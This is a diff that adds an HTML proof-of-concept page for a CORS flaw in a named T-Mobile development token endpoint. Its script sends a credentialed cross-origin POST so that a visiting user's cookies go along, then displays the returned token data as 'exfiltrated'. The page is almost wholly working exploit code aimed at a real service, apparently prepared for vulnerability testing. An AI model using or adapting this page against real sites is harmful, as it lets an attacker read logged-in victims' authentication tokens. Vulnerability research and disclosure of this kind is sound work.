@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Vulnerability PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .box { background: #f4f4f4; padding: 15px; border-radius: 5px; border: 1px solid #ddd; margin-top: 10px; word-wrap: break-word; white-space: pre-wrap; }
+        .danger { color: #d9534f; font-weight: bold; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1>CORS Data Exfiltration Proof of Concept</h1>
+    <p>Target: <code>https://syncup-platform-dev.t-mobile.com/guest-auth/prd01/guest/v1/tokens</code></p>
+    
+    <button onclick="exploit()">Execute Exploit</button>
+
+    <h3>Status:</h3>
+    <div id="status">Ready...</div>
+
+    <h3>Exfiltrated Response Body:</h3>
+    <div id="output" class="box">No data yet. Click the button above.</div>
+
+    <script>
+        function exploit() {
+            var target = "https://syncup-platform-dev.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
+            var statusDiv = document.getElementById('status');
+            var outputDiv = document.getElementById('output');
+            
+            statusDiv.innerHTML = "Sending request...";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", target, true);
+            
+            // CRITICAL: This allows the browser to send the victim's T-Mobile cookies
+            xhr.withCredentials = true; 
+            
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.setRequestHeader("HeliosSourceApp", "promo-ui");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    statusDiv.innerHTML = "Request Completed. Status: " + xhr.status;
+                    if (xhr.status === 200) {
+                        outputDiv.innerText = xhr.responseText || "[Success: Response was empty but access was granted]";
+                        console.log("Full Response:", xhr.responseText);
+                    } else {
+                        outputDiv.innerHTML = "<span class='danger'>Error " + xhr.status + "</span>";
+                    }
+                }
+            };
+
+            // Payload identified in your earlier Nuclei scan
+            var body = JSON.stringify({"client_id":"SIDWeb"});
+            xhr.send(body);
+        }
+    </script>
+</body>
+</html>
